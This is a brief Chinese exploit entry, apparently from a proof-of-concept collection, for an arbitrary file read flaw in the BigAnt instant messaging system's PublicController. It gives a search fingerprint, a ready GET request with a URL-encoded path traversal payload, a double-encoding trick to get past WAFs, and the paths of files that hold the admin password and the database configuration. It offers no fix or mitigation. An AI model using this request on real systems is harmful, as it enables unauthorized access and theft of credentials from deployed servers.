# 大蚂蚁(BigAnt)即时通讯系统PublicController存在任意文件读取漏洞

大蚂蚁(BigAnt)即时通讯系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`product="即时通讯系统"`
- **请求**：`GET /?m=Admin&c=Public&a=download&file=%2f%2e%2e%2e%2e%2f%2f%69%6e%73%74%61%6c%6c%2e%63%6d%64&name=README.txt HTTP/1.1`

**Payload**
```
功读取到web根目录上一级目录下的 install.cmd文件内容。
因为$file = urldecode($file);的存在，我们还可以双重url编码参数file,达到bypass部分垃圾waf.
或者读取其他敏感文件如/Runtime/Data/ms_admin.php 它包含当前系统用户admin的密码
或者 installData.php ，包含系统数据库配置信息
```
- **响应特征**：200